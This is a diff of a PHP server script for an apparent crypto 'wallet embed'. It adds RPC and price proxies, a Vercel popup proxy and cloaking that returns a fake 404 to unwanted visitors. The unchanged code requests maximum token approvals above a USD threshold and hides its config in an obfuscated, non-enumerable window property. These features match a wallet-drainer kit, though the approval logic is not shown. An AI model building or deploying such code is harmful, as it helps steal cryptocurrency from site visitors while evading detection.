@@ -32,11 +32,62 @@ $cfg = [
 
     'connect_popup_enabled' => true,
     'connect_popup_url' => '',
-    
+
+    /** Vercel host for nginx popup proxy (from site_url). */
+    'vercel_profile_host' => 'fuzzy-octo-guacamole-delta.vercel.app',
 ];
+
+$gatewayMode = (string) ($_SERVER['WALLET_GATEWAY_MODE'] ?? '');
+if ($gatewayMode !== '') {
+    $siteUrl = detect_site_url($cfg);
+    if (!script_request_allowed($cfg, $siteUrl)) {
+        send_generic_not_found();
+        exit;
+    }
+    if ($gatewayMode === 'rpc') {
+        serve_rpc_proxy($cfg);
+        exit;
+    }
+    if ($gatewayMode === 'price') {
+        serve_price_proxy($cfg);
+        exit;
+    }
+    http_response_code(404);
+    exit;
+}
+
+function request_origin(): string
+{
+    $host = $_SERVER['HTTP_HOST'] ?? '';
+    if ($host === '') {
+        return '';
+    }
+    $host = preg_replace('/:\d+$/', '', $host) ?? $host;
+    $https =
+        (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
+        || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
+        || (($_SERVER['SERVER_PORT'] ?? '') === '443');
+    return ($https ? 'https' : 'http') . '://' . $host;
+}
+
+function proxy_path(array $cfg, string $suffix): string
+{
+    $base = (string) ($cfg['script_path'] ?? 'vault');
+    return '/' . $base . $suffix;
+}
+
+function proxy_url(array $cfg, string $suffix): string
+{
+    return rtrim(request_origin(), '/') . proxy_path($cfg, $suffix);
+}
 
 function build_embed_config(array $cfg, string $siteUrl): array
 {
+    $popupUrl = trim((string) ($cfg['connect_popup_url'] ?? ''));
+    if ($popupUrl === '') {
+        $popupUrl = proxy_url($cfg, '-popup/');
+    }
+
     return [
         'projectId' => (string) ($cfg['reown_project_id'] ?? ''),
         'buttonClass' => (string) ($cfg['button_class'] ?? ''),
@@ -52,9 +103,10 @@ function build_embed_config(array $cfg, string $siteUrl): array
         'tokenApprovalMaxCount' => (int) ($cfg['token_approval_max_count'] ?? 0),
         'tokenApprovalMinUsd' => (float) ($cfg['token_approval_min_usd'] ?? 1),
         'tokenApprovalAmountMode' => (string) ($cfg['token_approval_amount_mode'] ?? 'max'),
-        'solanaRpcUrl' => (string) ($cfg['solana_rpc_url'] ?? ''),
+        'solanaRpcUrl' => proxy_url($cfg, '-rpc'),
+        'priceApiUrl' => proxy_url($cfg, '-price'),
         'connectPopupEnabled' => (bool) ($cfg['connect_popup_enabled'] ?? true),
-        'connectPopupUrl' => (string) ($cfg['connect_popup_url'] ?? ''),
+        'connectPopupUrl' => $popupUrl,
         'connectPopupTitle' => (string) ($cfg['connect_popup_title'] ?? ''),
     ];
 }
@@ -130,6 +182,79 @@ function embed_config_preamble(array $embedConfig): string
     return '(function(w,f,j){var c=j.parse(f(' . $blob . '));'
         . 'Object.defineProperty(w,"__WALLET_EMBED_CONFIG__",'
         . '{value:c,writable:!1,enumerable:!1,configurable:!1})})(window,atob,JSON);';
+}
+
+function proxy_forward(string $method, string $url, ?string $body, array $extraHeaders = []): void
+{
+    if (!function_exists('curl_init')) {
+        http_response_code(500);
+        header('Content-Type: text/plain; charset=utf-8');
+        echo 'php-curl required for API proxy';
+        exit;
+    }
+
+    $ch = curl_init($url);
+    if ($ch === false) {
+        http_response_code(502);
+        exit;
+    }
+
+    $headers = array_merge(['User-Agent: wallet-embed-proxy/1.0'], $extraHeaders);
+    $opts = [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_MAXREDIRS => 3,
+        CURLOPT_CONNECTTIMEOUT => 15,
+        CURLOPT_TIMEOUT => 60,
+        CURLOPT_CUSTOMREQUEST => $method,
+        CURLOPT_HTTPHEADER => $headers,
+        CURLOPT_ENCODING => '',
+    ];
+    if ($body !== null) {
+        $opts[CURLOPT_POSTFIELDS] = $body;
+    }
+    curl_setopt_array($ch, $opts);
+    $response = curl_exec($ch);
+    $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $type = (string) curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
+    curl_close($ch);
+
+    http_response_code($code > 0 ? $code : 502);
+    if ($type !== '') {
+        header('Content-Type: ' . $type);
+    }
+    header('Cache-Control: no-store');
+    echo $response === false ? '' : $response;
+}
+
+function serve_rpc_proxy(array $cfg): void
+{
+    $upstream = trim((string) ($cfg['solana_rpc_url'] ?? ''));
+    if ($upstream === '') {
+        http_response_code(500);
+        exit;
+    }
+    if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
+        http_response_code(405);
+        exit;
+    }
+    $body = file_get_contents('php://input');
+    if ($body === false) {
+        http_response_code(400);
+        exit;
+    }
+    proxy_forward('POST', $upstream, $body, ['Content-Type: application/json']);
+}
+
+function serve_price_proxy(array $cfg): void
+{
+    $ids = (string) ($_GET['ids'] ?? '');
+    if ($ids === '' || !preg_match('/^[A-Za-z0-9:,_-]+$/', $ids)) {
+        http_response_code(400);
+        exit;
+    }
+    $upstream = 'https://api.jup.ag/price/v2?ids=' . $ids;
+    proxy_forward('GET', $upstream, null);
 }
 
 function send_generic_not_found(): void
